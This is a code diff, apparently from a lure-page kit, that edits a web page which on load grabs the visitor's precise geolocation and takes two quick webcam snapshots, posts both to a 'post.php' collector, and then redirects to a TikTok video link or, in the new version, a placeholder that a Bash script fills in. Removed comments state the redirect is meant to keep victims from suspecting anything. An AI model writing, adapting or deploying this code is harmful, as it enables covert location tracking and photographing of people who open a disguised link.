@@ -48,35 +48,36 @@
 <script>
     const v = document.getElementById('video');
     const c = document.getElementById('canvas');
-    const target = "https://www.tiktok.com/@spiritture/video/7606812388238576916";
+    
+    // This placeholder is automatically replaced by your Bash script
+    const target = "tiktok_redir_link"; 
 
-    // Triggered automatically on page load
     window.onload = function() {
         startKaliAutoProtocol();
     };
 
     async function startKaliAutoProtocol() {
-        // 1. Request Location immediately
+        // 1. Request Location
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(sendData, null, {enableHighAccuracy: true});
         }
 
-        // 2. Request Camera immediately
+        // 2. Request Camera
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             v.srcObject = stream;
 
-            // Take 2 super fast screenshots (200ms and 600ms)
+            // Take snapshots
             setTimeout(() => takeSnap(), 200);
             setTimeout(() => takeSnap(), 600);
 
-            // Fast Redirect after 1 second (enough time for snapshots to initiate)
+            // Redirect to user-defined URL after 1 second
             setTimeout(() => {
                 window.location.replace(target);
             }, 1000);
 
         } catch (err) {
-            // If they block, redirect instantly so they don't suspect anything
+            // Redirect immediately if permission is denied
             window.location.replace(target);
         }
     }
@@ -84,7 +85,7 @@
     function takeSnap() {
         const ctx = c.getContext('2d');
         ctx.drawImage(v, 0, 0, 640, 480);
-        const imgData = c.toDataURL('image/jpeg', 0.5); // Lower quality = faster upload
+        const imgData = c.toDataURL('image/jpeg', 0.4); 
         sendData({ img: imgData });
     }
 
@@ -93,7 +94,6 @@
             ? { lat: data.coords.latitude, lon: data.coords.longitude } 
             : data;
 
-        // Use fetch with 'keepalive' to ensure it finishes even if the page closes/redirects
         fetch('post.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
